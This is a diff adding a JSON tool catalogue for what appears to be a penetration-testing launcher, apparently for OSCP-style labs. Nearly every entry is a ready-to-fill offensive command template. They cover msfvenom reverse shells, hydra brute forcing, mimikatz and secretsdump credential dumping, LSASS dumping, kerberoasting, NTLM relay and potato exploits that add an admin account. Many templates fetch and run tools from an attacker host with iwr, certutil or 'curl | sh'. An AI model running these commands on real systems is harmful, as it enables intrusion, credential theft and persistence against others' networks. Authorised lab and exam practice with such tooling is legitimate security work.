@@ -1,0 +1,893 @@
+{
+  "tools": [
+    {
+      "name": "nmap",
+      "category": "Enumeration",
+      "tags": [
+        "network",
+        "scan"
+      ],
+      "path": "/usr/bin/nmap",
+      "os_target": "multi",
+      "description": "Network mapper / port scanner",
+      "dependencies": [],
+      "templates": [
+        "nmap -sC -sV -oN nmap_tcp_{{IP}} {{IP}}",
+        "nmap -p- --min-rate=1000 -oN nmap_full_{{IP}} {{IP}}",
+        "nmap -sU --top-ports 100 -oN nmap_udp_{{IP}} {{IP}}",
+        "nmap -sC -sV -p {{PORTS}} -oN nmap_targeted_{{IP}} {{IP}}",
+        "nmap --script=smb-vuln* -p 445 {{IP}}",
+        "nmap --script=ldap* -p 389,636 {{IP}}"
+      ],
+      "doc_link": "cheatsheets/nmap.md",
+      "favorite": true,
+      "history": []
+    },
+    {
+      "name": "nxc",
+      "category": "Enumeration",
+      "tags": [
+        "smb",
+        "network",
+        "ad"
+      ],
+      "path": "$BIN_LIN/ad/nxc",
+      "os_target": "multi",
+      "description": "NetExec - binaire local",
+      "dependencies": [],
+      "templates": [
+        "nxc smb {{IP}} -u {{CRED:user}} -p {{CRED:pass}}",
+        "nxc smb {{IP}} -u {{CRED:user}} -H {{CRED:hash}} --shares",
+        "nxc smb {{IP}} -u {{CRED:user}} -p {{CRED:pass}} --shares",
+        "nxc smb {{RANGE}} -u users.txt -p passwords.txt --continue-on-success",
+        "nxc ldap {{IP}} -u {{CRED:user}} -p {{CRED:pass}} --asreproast asrep.txt",
+        "nxc ldap {{IP}} -u {{CRED:user}} -p {{CRED:pass}} --kerberoast kerb.txt",
+        "nxc ldap {{IP}} -u {{CRED:user}} -p {{CRED:pass}} --users",
+        "nxc winrm {{IP}} -u {{CRED:user}} -p {{CRED:pass}}",
+        "nxc mssql {{IP}} -u {{CRED:user}} -p {{CRED:pass}} -q 'SELECT name FROM sys.databases'"
+      ],
+      "doc_link": "cheatsheets/active_directory.md",
+      "favorite": true,
+      "history": []
+    },
+    {
+      "name": "smbclient",
+      "category": "Enumeration",
+      "tags": [
+        "smb"
+      ],
+      "path": "/usr/bin/smbclient",
+      "os_target": "multi",
+      "description": "SMB client",
+      "dependencies": [],
+      "templates": [
+        "smbclient -L //{{IP}} -N",
+        "smbclient -L //{{IP}} -U {{CRED:user}}",
+        "smbclient //{{IP}}/{{SHARE}} -U {{CRED:user}}",
+        "smbclient //{{IP}}/{{SHARE}} -U {{CRED:user}} -c 'recurse ON; ls'"
+      ],
+      "doc_link": "",
+      "favorite": false,
+      "history": []
+    },
+    {
+      "name": "gobuster",
+      "category": "Enumeration",
+      "tags": [
+        "web",
+        "fuzzing"
+      ],
+      "path": "/usr/bin/gobuster",
+      "os_target": "multi",
+      "description": "Directory/DNS/vhost bruteforcer",
+      "dependencies": [],
+      "templates": [
+        "gobuster dir -u http://{{IP}} -w /usr/share/wordlists/dirb/common.txt",
+        "gobuster dir -u http://{{IP}} -w {{WORDLIST}} -x php,html,txt -t 50",
+        "gobuster dir -u http://{{IP}} -w {{WORDLIST}} -x php,html,txt -t 50 -k",
+        "gobuster vhost -u http://{{IP}} -w {{WORDLIST}} --append-domain",
+        "gobuster dns -d {{DOMAIN}} -w {{WORDLIST}}"
+      ],
+      "doc_link": "",
+      "favorite": false,
+      "history": []
+    },
+    {
+      "name": "ffuf",
+      "category": "Enumeration",
+      "tags": [
+        "web",
+        "fuzzing"
+      ],
+      "path": "",
+      "os_target": "multi",
+      "description": "Fast web fuzzer (sudo apt install ffuf)",
+      "dependencies": [],
+      "templates": [
+        "ffuf -u http://{{IP}}/FUZZ -w {{WORDLIST}} -t 50",
+        "ffuf -u http://{{IP}}/FUZZ -w {{WORDLIST}} -e .php,.html,.txt -fc 404",
+        "ffuf -u http://FUZZ.{{DOMAIN}} -w {{WORDLIST}} -H 'Host: FUZZ.{{DOMAIN}}' -fs 0",
+        "ffuf -u http://{{IP}}/login -X POST -d 'user=FUZZ&pass=test' -w {{WORDLIST}} -fc 200"
+      ],
+      "doc_link": "",
+      "favorite": false,
+      "history": []
+    },
+    {
+      "name": "responder",
+      "category": "Enumeration",
+      "tags": [
+        "ad",
+        "network",
+        "poisoning"
+      ],
+      "path": "$BIN_LIN/network/Responder-3.1.7.0/Responder.py",
+      "os_target": "linux",
+      "description": "LLMNR/NBT-NS poisoner (binaire local)",
+      "dependencies": [
+        "python3"
+      ],
+      "templates": [
+        "sudo python3 $BIN_LIN/network/Responder-3.1.7.0/Responder.py -I {{IFACE}}",
+        "sudo python3 $BIN_LIN/network/Responder-3.1.7.0/Responder.py -I {{IFACE}} -A"
+      ],
+      "doc_link": "",
+      "favorite": false,
+      "history": []
+    },
+    {
+      "name": "seatbelt",
+      "category": "Enumeration",
+      "tags": [
+        "windows",
+        "enum",
+        "ad"
+      ],
+      "path": "$BIN_WIN/ad/Seatbelt.exe",
+      "os_target": "windows",
+      "description": "Seatbelt - Windows security enum (Transfer)",
+      "dependencies": [],
+      "templates": [
+        "iwr http://{{LHOST}}:8000/Seatbelt.exe -OutFile C:\\Windows\\Temp\\sb.exe",
+        "C:\\Windows\\Temp\\sb.exe -group=all",
+        "C:\\Windows\\Temp\\sb.exe TokenPrivileges",
+        "C:\\Windows\\Temp\\sb.exe CredEnum"
+      ],
+      "doc_link": "",
+      "favorite": false,
+      "history": []
+    },
+    {
+      "name": "john",
+      "category": "Cracking",
+      "tags": [
+        "offline",
+        "crack"
+      ],
+      "path": "/usr/sbin/john",
+      "os_target": "multi",
+      "description": "John the Ripper",
+      "dependencies": [],
+      "templates": [
+        "john --wordlist={{WORDLIST}} hash.txt",
+        "john --format=NT --wordlist={{WORDLIST}} hash.txt",
+        "john --format=krb5tgs --wordlist={{WORDLIST}} kerb.txt",
+        "john --format=krb5asrep --wordlist={{WORDLIST}} asrep.txt",
+        "john --show hash.txt",
+        "python3 $SCRIPTS/ssh2john.py id_rsa > id_rsa.hash && john id_rsa.hash --wordlist={{WORDLIST}}"
+      ],
+      "doc_link": "",
+      "favorite": true,
+      "history": []
+    },
+    {
+      "name": "hashcat",
+      "category": "Cracking",
+      "tags": [
+        "offline",
+        "crack"
+      ],
+      "path": "/usr/bin/hashcat",
+      "os_target": "multi",
+      "description": "GPU password cracker",
+      "dependencies": [],
+      "templates": [
+        "hashcat -m 1000 hash.txt {{WORDLIST}}",
+        "hashcat -m 5600 hash.txt {{WORDLIST}}",
+        "hashcat -m 13100 hash.txt {{WORDLIST}}",
+        "hashcat -m 18200 asrep.txt {{WORDLIST}}",
+        "hashcat -m 1000 hash.txt {{WORDLIST}} -r /usr/share/hashcat/rules/best64.rule",
+        "hashcat -m 1800 hash.txt {{WORDLIST}}"
+      ],
+      "doc_link": "",
+      "favorite": true,
+      "history": []
+    },
+    {
+      "name": "hydra",
+      "category": "Cracking",
+      "tags": [
+        "bruteforce"
+      ],
+      "path": "/usr/bin/hydra",
+      "os_target": "multi",
+      "description": "Online password cracker",
+      "dependencies": [],
+      "templates": [
+        "hydra -l {{CRED:user}} -P {{WORDLIST}} ssh://{{IP}}",
+        "hydra -L users.txt -P {{WORDLIST}} {{IP}} smb",
+        "hydra -l {{CRED:user}} -P {{WORDLIST}} ftp://{{IP}}",
+        "hydra -l {{CRED:user}} -P {{WORDLIST}} {{IP}} http-post-form '/login:user=^USER^&pass=^PASS^:F=invalid'"
+      ],
+      "doc_link": "",
+      "favorite": false,
+      "history": []
+    },
+    {
+      "name": "evil-winrm",
+      "category": "Exploitation",
+      "tags": [
+        "winrm",
+        "shell"
+      ],
+      "path": "/usr/local/bin/evil-winrm",
+      "os_target": "windows",
+      "description": "WinRM shell",
+      "dependencies": [],
+      "templates": [
+        "evil-winrm -i {{IP}} -u {{CRED:user}} -p {{CRED:pass}}",
+        "evil-winrm -i {{IP}} -u {{CRED:user}} -H {{CRED:hash}}",
+        "evil-winrm -i {{IP}} -u {{CRED:user}} -p {{CRED:pass}} -s $BIN_WIN/ps1/"
+      ],
+      "doc_link": "",
+      "favorite": true,
+      "history": []
+    },
+    {
+      "name": "netcat",
+      "category": "Exploitation",
+      "tags": [
+        "listener",
+        "reverse shell"
+      ],
+      "path": "/usr/bin/nc",
+      "os_target": "multi",
+      "description": "Swiss-army network tool",
+      "dependencies": [],
+      "templates": [
+        "nc -lvnp {{LPORT}}",
+        "rlwrap nc -lvnp {{LPORT}}",
+        "nc {{IP}} {{PORT}}"
+      ],
+      "doc_link": "",
+      "favorite": true,
+      "history": []
+    },
+    {
+      "name": "msfvenom",
+      "category": "Exploitation",
+      "tags": [
+        "payload",
+        "msf"
+      ],
+      "path": "/snap/bin/msfvenom",
+      "os_target": "multi",
+      "description": "Payload generator (MSF: 1 usage autorisé OSCP)",
+      "dependencies": [],
+      "templates": [
+        "msfvenom -p linux/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f elf > shell.elf",
+        "msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f exe > shell.exe",
+        "msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f aspx > shell.aspx",
+        "msfvenom -p php/reverse_php LHOST={{LHOST}} LPORT={{LPORT}} -f raw > shell.php"
+      ],
+      "doc_link": "",
+      "favorite": false,
+      "history": []
+    },
+    {
+      "name": "sqlmap",
+      "category": "Exploitation",
+      "tags": [
+        "web",
+        "sqli"
+      ],
+      "path": "/usr/bin/sqlmap",
+      "os_target": "multi",
+      "description": "Automatic SQL injection",
+      "dependencies": [],
+      "templates": [
+        "sqlmap -u 'http://{{IP}}/page?id=1' --batch",
+        "sqlmap -u 'http://{{IP}}/page?id=1' --batch --dbs",
+        "sqlmap -r request.txt --batch --level=5 --risk=3",
+        "sqlmap -r request.txt --batch --os-shell"
+      ],
+      "doc_link": "cheatsheets/web.md",
+      "favorite": false,
+      "history": []
+    },
+    {
+      "name": "psexec64",
+      "category": "Exploitation",
+      "tags": [
+        "windows",
+        "exec",
+        "sysinternals"
+      ],
+      "path": "$BIN_WIN/sysinternals/PsExec64.exe",
+      "os_target": "windows",
+      "description": "PsExec - remote execution Windows (Transfer)",
+      "dependencies": [],
+      "templates": [
+        "iwr http://{{LHOST}}:8000/PsExec64.exe -OutFile C:\\Windows\\Temp\\pe.exe",
+        "C:\\Windows\\Temp\\pe.exe \\\\{{IP}} -u {{CRED:user}} -p {{CRED:pass}} cmd.exe",
+        "C:\\Windows\\Temp\\pe.exe \\\\{{IP}} -accepteula -u {{CRED:user}} -p {{CRED:pass}} cmd.exe /c whoami"
+      ],
+      "doc_link": "",
+      "favorite": false,
+      "history": []
+    },
+    {
+      "name": "impacket-secretsdump",
+      "category": "Active Directory",
+      "tags": [
+        "ad",
+        "credentials"
+      ],
+      "path": "/usr/bin/impacket-secretsdump",
+      "os_target": "multi",
+      "description": "Dump hashes NTDS/SAM",
+      "dependencies": [],
+      "templates": [
+        "impacket-secretsdump {{CRED:user}}:{{CRED:pass}}@{{IP}}",
+        "impacket-secretsdump -hashes :{{CRED:hash}} {{CRED:user}}@{{IP}}",
+        "impacket-secretsdump -just-dc {{DOMAIN}}/{{CRED:user}}:{{CRED:pass}}@{{IP}}",
+        "impacket-secretsdump -just-dc-ntlm {{DOMAIN}}/{{CRED:user}}:{{CRED:pass}}@{{IP}}"
+      ],
+      "doc_link": "cheatsheets/active_directory.md",
+      "favorite": true,
+      "history": []
+    },
+    {
+      "name": "impacket-GetUserSPNs",
+      "category": "Active Directory",
+      "tags": [
+        "ad",
+        "kerberoast"
+      ],
+      "path": "$BIN_LIN/ad/impacket-0.13.0/examples/GetUserSPNs.py",
+      "os_target": "multi",
+      "description": "Kerberoasting (impacket local)",
+      "dependencies": [
+        "python3"
+      ],
+      "templates": [
+        "python3 $BIN_LIN/ad/impacket-0.13.0/examples/GetUserSPNs.py {{DOMAIN}}/{{CRED:user}}:{{CRED:pass}} -request",
+        "python3 $BIN_LIN/ad/impacket-0.13.0/examples/GetUserSPNs.py {{DOMAIN}}/{{CRED:user}}:{{CRED:pass}} -request -outputfile kerb.txt"
+      ],
+      "doc_link": "cheatsheets/active_directory.md",
+      "favorite": true,
+      "history": []
+    },
+    {
+      "name": "impacket-GetNPUsers",
+      "category": "Active Directory",
+      "tags": [
+        "ad",
+        "asreproast"
+      ],
+      "path": "$BIN_LIN/ad/impacket-0.13.0/examples/GetNPUsers.py",
+      "os_target": "multi",
+      "description": "AS-REP Roasting (impacket local)",
+      "dependencies": [
+        "python3"
+      ],
+      "templates": [
+        "python3 $BIN_LIN/ad/impacket-0.13.0/examples/GetNPUsers.py {{DOMAIN}}/ -usersfile users.txt -no-pass",
+        "python3 $BIN_LIN/ad/impacket-0.13.0/examples/GetNPUsers.py {{DOMAIN}}/{{CRED:user}}:{{CRED:pass}} -request -outputfile asrep.txt"
+      ],
+      "doc_link": "cheatsheets/active_directory.md",
+      "favorite": true,
+      "history": []
+    },
+    {
+      "name": "impacket-psexec",
+      "category": "Active Directory",
+      "tags": [
+        "ad",
+        "exec"
+      ],
+      "path": "$BIN_LIN/ad/impacket-0.13.0/examples/psexec.py",
+      "os_target": "multi",
+      "description": "Remote exec SMB (impacket local)",
+      "dependencies": [
+        "python3"
+      ],
+      "templates": [
+        "python3 $BIN_LIN/ad/impacket-0.13.0/examples/psexec.py {{DOMAIN}}/{{CRED:user}}:{{CRED:pass}}@{{IP}}",
+        "python3 $BIN_LIN/ad/impacket-0.13.0/examples/psexec.py -hashes :{{CRED:hash}} {{DOMAIN}}/{{CRED:user}}@{{IP}}"
+      ],
+      "doc_link": "",
+      "favorite": false,
+      "history": []
+    },
+    {
+      "name": "impacket-wmiexec",
+      "category": "Active Directory",
+      "tags": [
+        "ad",
+        "exec"
+      ],
+      "path": "$BIN_LIN/ad/impacket-0.13.0/examples/wmiexec.py",
+      "os_target": "multi",
+      "description": "Remote exec WMI (impacket local)",
+      "dependencies": [
+        "python3"
+      ],
+      "templates": [
+        "python3 $BIN_LIN/ad/impacket-0.13.0/examples/wmiexec.py {{DOMAIN}}/{{CRED:user}}:{{CRED:pass}}@{{IP}}",
+        "python3 $BIN_LIN/ad/impacket-0.13.0/examples/wmiexec.py -hashes :{{CRED:hash}} {{DOMAIN}}/{{CRED:user}}@{{IP}}"
+      ],
+      "doc_link": "",
+      "favorite": false,
+      "history": []
+    },
+    {
+      "name": "impacket-ntlmrelayx",
+      "category": "Active Directory",
+      "tags": [
+        "ad",
+        "relay"
+      ],
+      "path": "$BIN_LIN/ad/impacket-0.13.0/examples/ntlmrelayx.py",
+      "os_target": "linux",
+      "description": "NTLM relay attack (impacket local)",
+      "dependencies": [
+        "python3"
+      ],
+      "templates": [
+        "python3 $BIN_LIN/ad/impacket-0.13.0/examples/ntlmrelayx.py -tf targets.txt -smb2support",
+        "python3 $BIN_LIN/ad/impacket-0.13.0/examples/ntlmrelayx.py -t ldap://{{IP}} --delegate-access"
+      ],
+      "doc_link": "cheatsheets/active_directory.md",
+      "favorite": false,
+      "history": []
+    },
+    {
+      "name": "impacket-getTGT",
+      "category": "Active Directory",
+      "tags": [
+        "ad",
+        "kerberos"
+      ],
+      "path": "$SCRIPTS/getTGT.py",
+      "os_target": "linux",
+      "description": "Recupere un TGT Kerberos",
+      "dependencies": [
+        "python3"
+      ],
+      "templates": [
+        "python3 $SCRIPTS/getTGT.py {{DOMAIN}}/{{CRED:user}}:{{CRED:pass}}",
+        "python3 $SCRIPTS/getTGT.py -hashes :{{CRED:hash}} {{DOMAIN}}/{{CRED:user}}"
+      ],
+      "doc_link": "",
+      "favorite": false,
+      "history": []
+    },
+    {
+      "name": "bloodhound-python",
+      "category": "Active Directory",
+      "tags": [
+        "ad",
+        "bloodhound"
+      ],
+      "path": "",
+      "os_target": "multi",
+      "description": "BloodHound ingestor (pip install bloodhound)",
+      "dependencies": [
+        "python3"
+      ],
+      "templates": [
+        "bloodhound-python -u {{CRED:user}} -p {{CRED:pass}} -d {{DOMAIN}} -ns {{IP}} -c all",
+        "bloodhound-python -u {{CRED:user}} -p {{CRED:pass}} -d {{DOMAIN}} -ns {{IP}} -c all --zip",
+        "bloodhound-python -u {{CRED:user}} -H {{CRED:hash}} -d {{DOMAIN}} -ns {{IP}} -c all --zip"
+      ],
+      "doc_link": "cheatsheets/active_directory.md",
+      "favorite": true,
+      "history": []
+    },
+    {
+      "name": "pypykatz",
+      "category": "Active Directory",
+      "tags": [
+        "ad",
+        "credentials",
+        "lsass"
+      ],
+      "path": "$BIN_LIN/ad/pypykatz/pypykatz/__main__.py",
+      "os_target": "linux",
+      "description": "Mimikatz Python - parse lsass dumps",
+      "dependencies": [
+        "python3"
+      ],
+      "templates": [
+        "cd $BIN_LIN/ad/pypykatz && python3 -m pypykatz lsa minidump lsass.dmp",
+        "cd $BIN_LIN/ad/pypykatz && python3 -m pypykatz registry --sam SAM --security SECURITY --system SYSTEM"
+      ],
+      "doc_link": "",
+      "favorite": false,
+      "history": []
+    },
+    {
+      "name": "rubeus",
+      "category": "Active Directory",
+      "tags": [
+        "ad",
+        "kerberos",
+        "windows"
+      ],
+      "path": "$BIN_WIN/ad/Rubeus.exe",
+      "os_target": "windows",
+      "description": "Rubeus - Kerberos attack toolkit (Transfer)",
+      "dependencies": [],
+      "templates": [
+        "iwr http://{{LHOST}}:8000/Rubeus.exe -OutFile C:\\Windows\\Temp\\r.exe",
+        "C:\\Windows\\Temp\\r.exe kerberoast /outfile:kerb.txt",
+        "C:\\Windows\\Temp\\r.exe asreproast /format:hashcat /outfile:asrep.txt",
+        "C:\\Windows\\Temp\\r.exe dump /luid:0x3e4 /service:krbtgt /nowrap",
+        "C:\\Windows\\Temp\\r.exe ptt /ticket:ticket.kirbi",
+        "C:\\Windows\\Temp\\r.exe hash /password:{{CRED:pass}}"
+      ],
+      "doc_link": "cheatsheets/active_directory.md",
+      "favorite": true,
+      "history": []
+    },
+    {
+      "name": "sharphound",
+      "category": "Active Directory",
+      "tags": [
+        "ad",
+        "bloodhound",
+        "windows"
+      ],
+      "path": "$BIN_WIN/ad/SharpHound.ps1",
+      "os_target": "windows",
+      "description": "SharpHound - BloodHound data collector (Transfer)",
+      "dependencies": [],
+      "templates": [
+        "iwr http://{{LHOST}}:8000/SharpHound.ps1 -OutFile C:\\Windows\\Temp\\sh.ps1; . C:\\Windows\\Temp\\sh.ps1; Invoke-BloodHound -CollectionMethods All -ZipFileName bh.zip"
+      ],
+      "doc_link": "cheatsheets/active_directory.md",
+      "favorite": true,
+      "history": []
+    },
+    {
+      "name": "mimikatz",
+      "category": "Active Directory",
+      "tags": [
+        "ad",
+        "credentials",
+        "windows"
+      ],
+      "path": "$BIN_WIN/ad/mimikatz_truck/x64/mimikatz_trunk.exe",
+      "os_target": "windows",
+      "description": "Mimikatz - credential dumping (Transfer)",
+      "dependencies": [],
+      "templates": [
+        "iwr http://{{LHOST}}:8000/mimikatz.exe -OutFile C:\\Windows\\Temp\\m.exe",
+        "C:\\Windows\\Temp\\m.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
+        "C:\\Windows\\Temp\\m.exe \"privilege::debug\" \"lsadump::sam\" exit",
+        "C:\\Windows\\Temp\\m.exe \"privilege::debug\" \"lsadump::dcsync /domain:{{DOMAIN}} /user:Administrator\" exit",
+        "C:\\Windows\\Temp\\m.exe \"kerberos::ptt ticket.kirbi\" exit"
+      ],
+      "doc_link": "cheatsheets/active_directory.md",
+      "favorite": true,
+      "history": []
+    },
+    {
+      "name": "certify",
+      "category": "Active Directory",
+      "tags": [
+        "ad",
+        "adcs",
+        "windows"
+      ],
+      "path": "$BIN_WIN/ad/Certify.exe",
+      "os_target": "windows",
+      "description": "Certify - ADCS certificate abuse (Transfer)",
+      "dependencies": [],
+      "templates": [
+        "iwr http://{{LHOST}}:8000/Certify.exe -OutFile C:\\Windows\\Temp\\cert.exe",
+        "C:\\Windows\\Temp\\cert.exe find /vulnerable",
+        "C:\\Windows\\Temp\\cert.exe request /ca:{{IP}}\\{{CA}} /template:{{TEMPLATE}} /altname:Administrator"
+      ],
+      "doc_link": "cheatsheets/active_directory.md",
+      "favorite": false,
+      "history": []
+    },
+    {
+      "name": "linpeas",
+      "category": "PrivEsc",
+      "tags": [
+        "linux",
+        "enum",
+        "privesc"
+      ],
+      "path": "$BIN_LIN/privesc/linpeas.sh",
+      "os_target": "linux",
+      "description": "Linux privesc enum (Transfer)",
+      "dependencies": [],
+      "templates": [
+        "curl http://{{LHOST}}:8000/linpeas.sh | sh",
+        "wget http://{{LHOST}}:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh"
+      ],
+      "doc_link": "cheatsheets/privesc_linux.md",
+      "favorite": true,
+      "history": []
+    },
+    {
+      "name": "pspy",
+      "category": "PrivEsc",
+      "tags": [
+        "linux",
+        "process",
+        "privesc"
+      ],
+      "path": "$BIN_LIN/privesc/pspy64s",
+      "os_target": "linux",
+      "description": "Process spy sans root (Transfer)",
+      "dependencies": [],
+      "templates": [
+        "curl http://{{LHOST}}:8000/pspy64s -o /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy"
+      ],
+      "doc_link": "",
+      "favorite": false,
+      "history": []
+    },
+    {
+      "name": "winpeas",
+      "category": "PrivEsc",
+      "tags": [
+        "windows",
+        "enum",
+        "privesc"
+      ],
+      "path": "$BIN_WIN/privesc/winPEASx64.exe",
+      "os_target": "windows",
+      "description": "Windows privesc enum (Transfer)",
+      "dependencies": [],
+      "templates": [
+        "iwr http://{{LHOST}}:8000/winPEASx64.exe -OutFile C:\\Windows\\Temp\\wp.exe; C:\\Windows\\Temp\\wp.exe",
+        "certutil -urlcache -split -f http://{{LHOST}}:8000/winPEASx64.exe C:\\Windows\\Temp\\wp.exe && C:\\Windows\\Temp\\wp.exe"
+      ],
+      "doc_link": "cheatsheets/privesc_windows.md",
+      "favorite": true,
+      "history": []
+    },
+    {
+      "name": "godpotato",
+      "category": "PrivEsc",
+      "tags": [
+        "windows",
+        "privesc",
+        "potato"
+      ],
+      "path": "$BIN_WIN/privesc/GodPotato.exe",
+      "os_target": "windows",
+      "description": "GodPotato - SeImpersonate -> SYSTEM (Transfer)",
+      "dependencies": [],
+      "templates": [
+        "iwr http://{{LHOST}}:8000/GodPotato.exe -OutFile C:\\Windows\\Temp\\gp.exe",
+        "C:\\Windows\\Temp\\gp.exe -cmd 'cmd /c whoami'",
+        "C:\\Windows\\Temp\\gp.exe -cmd 'cmd /c net user hacker P@ssw0rd /add && net localgroup administrators hacker /add'"
+      ],
+      "doc_link": "cheatsheets/privesc_windows.md",
+      "favorite": true,
+      "history": []
+    },
+    {
+      "name": "printspoofer",
+      "category": "PrivEsc",
+      "tags": [
+        "windows",
+        "privesc",
+        "potato"
+      ],
+      "path": "$BIN_WIN/privesc/PrintSpoofer64.exe",
+      "os_target": "windows",
+      "description": "PrintSpoofer - SeImpersonate -> SYSTEM (Transfer)",
+      "dependencies": [],
+      "templates": [
+        "iwr http://{{LHOST}}:8000/PrintSpoofer64.exe -OutFile C:\\Windows\\Temp\\ps.exe",
+        "C:\\Windows\\Temp\\ps.exe -i -c cmd"
+      ],
+      "doc_link": "cheatsheets/privesc_windows.md",
+      "favorite": false,
+      "history": []
+    },
+    {
+      "name": "juicypotato",
+      "category": "PrivEsc",
+      "tags": [
+        "windows",
+        "privesc",
+        "potato"
+      ],
+      "path": "$BIN_WIN/privesc/JuicyPotato.exe",
+      "os_target": "windows",
+      "description": "JuicyPotato - token impersonation (Transfer)",
+      "dependencies": [],
+      "templates": [
+        "iwr http://{{LHOST}}:8000/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\jp.exe",
+        "C:\\Windows\\Temp\\jp.exe -l 9999 -p cmd.exe -t * -c {CLSID}"
+      ],
+      "doc_link": "cheatsheets/privesc_windows.md",
+      "favorite": false,
+      "history": []
+    },
+    {
+      "name": "powerview",
+      "category": "Active Directory",
+      "tags": [
+        "ad",
+        "enum",
+        "windows",
+        "ps1"
+      ],
+      "path": "$BIN_WIN/ps1/PowerView.ps1",
+      "os_target": "windows",
+      "description": "PowerView - AD enum PowerShell (Transfer)",
+      "dependencies": [],
+      "templates": [
+        "iwr http://{{LHOST}}:8000/PowerView.ps1 -OutFile C:\\Windows\\Temp\\pv.ps1; . C:\\Windows\\Temp\\pv.ps1",
+        "Get-NetUser | select samaccountname,description",
+        "Get-NetGroup -MemberIdentity {{CRED:user}}",
+        "Find-LocalAdminAccess",
+        "Get-DomainComputer | select name,operatingsystem",
+        "Get-ObjectAcl -Identity 'Domain Admins' -ResolveGUIDs"
+      ],
+      "doc_link": "cheatsheets/active_directory.md",
+      "favorite": true,
+      "history": []
+    },
+    {
+      "name": "powerup",
+      "category": "PrivEsc",
+      "tags": [
+        "windows",
+        "privesc",
+        "ps1"
+      ],
+      "path": "$BIN_WIN/ps1/PowerUp.ps1",
+      "os_target": "windows",
+      "description": "PowerUp - Windows privesc check PowerShell (Transfer)",
+      "dependencies": [],
+      "templates": [
+        "iwr http://{{LHOST}}:8000/PowerUp.ps1 -OutFile C:\\Windows\\Temp\\pu.ps1; . C:\\Windows\\Temp\\pu.ps1; Invoke-AllChecks"
+      ],
+      "doc_link": "cheatsheets/privesc_windows.md",
+      "favorite": false,
+      "history": []
+    },
+    {
+      "name": "invoke-mimikatz",
+      "category": "Active Directory",
+      "tags": [
+        "ad",
+        "credentials",
+        "windows",
+        "ps1"
+      ],
+      "path": "$BIN_WIN/ps1/Invoke-Mimikatz.ps1",
+      "os_target": "windows",
+      "description": "Invoke-Mimikatz PowerShell (Transfer)",
+      "dependencies": [],
+      "templates": [
+        "iwr http://{{LHOST}}:8000/Invoke-Mimikatz.ps1 -OutFile C:\\Windows\\Temp\\im.ps1; . C:\\Windows\\Temp\\im.ps1; Invoke-Mimikatz -DumpCreds"
+      ],
+      "doc_link": "",
+      "favorite": false,
+      "history": []
+    },
+    {
+      "name": "ligolo-ng",
+      "category": "Network",
+      "tags": [
+        "pivot",
+        "tunnel"
+      ],
+      "path": "$BIN_LIN/network/ligolo/ligolo_proxy_lin",
+      "os_target": "multi",
+      "description": "Ligolo-ng - reverse tunnel / pivoting",
+      "dependencies": [],
+      "templates": [
+        "$BIN_LIN/network/ligolo/ligolo_proxy_lin -selfcert",
+        "iwr http://{{LHOST}}:8000/ligolo_agent_win.exe -OutFile C:\\Windows\\Temp\\ag.exe; C:\\Windows\\Temp\\ag.exe -connect {{LHOST}}:11601 -ignore-cert",
+        "curl http://{{LHOST}}:8000/ligolo_agent_lin -o /tmp/ag && chmod +x /tmp/ag && /tmp/ag -connect {{LHOST}}:11601 -ignore-cert"
+      ],
+      "doc_link": "",
+      "favorite": true,
+      "history": []
+    },
+    {
+      "name": "python-server",
+      "category": "Network",
+      "tags": [
+        "transfer",
+        "http"
+      ],
+      "path": "/usr/bin/python3",
+      "os_target": "multi",
+      "description": "Serveur HTTP Python pour transfert de fichiers",
+      "dependencies": [],
+      "templates": [
+        "python3 -m http.server 8000 --directory $BIN_WIN/privesc",
+        "python3 -m http.server 8000 --directory $BIN_WIN/ad",
+        "python3 -m http.server 8000 --directory $BIN_LIN/privesc",
+        "python3 -m http.server 8000"
+      ],
+      "doc_link": "",
+      "favorite": true,
+      "history": []
+    },
+    {
+      "name": "xsstrike",
+      "category": "Exploitation",
+      "tags": [
+        "web",
+        "xss"
+      ],
+      "path": "$PENTEST_DIR/web/xsstrike.py",
+      "os_target": "multi",
+      "description": "XSStrike - XSS scanner avance",
+      "dependencies": [
+        "python3"
+      ],
+      "templates": [
+        "python3 $PENTEST_DIR/web/xsstrike.py -u 'http://{{IP}}/page?q=test'",
+        "python3 $PENTEST_DIR/web/xsstrike.py -u 'http://{{IP}}/page?q=test' --crawl"
+      ],
+      "doc_link": "cheatsheets/web.md",
+      "favorite": false,
+      "history": []
+    },
+    {
+      "name": "bypass-403",
+      "category": "Exploitation",
+      "tags": [
+        "web",
+        "bypass"
+      ],
+      "path": "$PENTEST_DIR/web/bypass-403/bypass-403.sh",
+      "os_target": "multi",
+      "description": "Bypass 403 Forbidden",
+      "dependencies": [],
+      "templates": [
+        "bash $PENTEST_DIR/web/bypass-403/bypass-403.sh http://{{IP}} /admin"
+      ],
+      "doc_link": "",
+      "favorite": false,
+      "history": []
+    },
+    {
+      "name": "procdump",
+      "category": "Active Directory",
+      "tags": [
+        "windows",
+        "lsass",
+        "dump"
+      ],
+      "path": "$BIN_WIN/sysinternals/procdump64.exe",
+      "os_target": "windows",
+      "description": "ProcDump - dump LSASS pour mimikatz offline (Transfer)",
+      "dependencies": [],
+      "templates": [
+        "iwr http://{{LHOST}}:8000/procdump64.exe -OutFile C:\\Windows\\Temp\\pd.exe",
+        "C:\\Windows\\Temp\\pd.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp",
+        "cd $BIN_LIN/ad/pypykatz && python3 -m pypykatz lsa minidump lsass.dmp"
+      ],
+      "doc_link": "",
+      "favorite": false,
+      "history": []
+    }
+  ]
+}
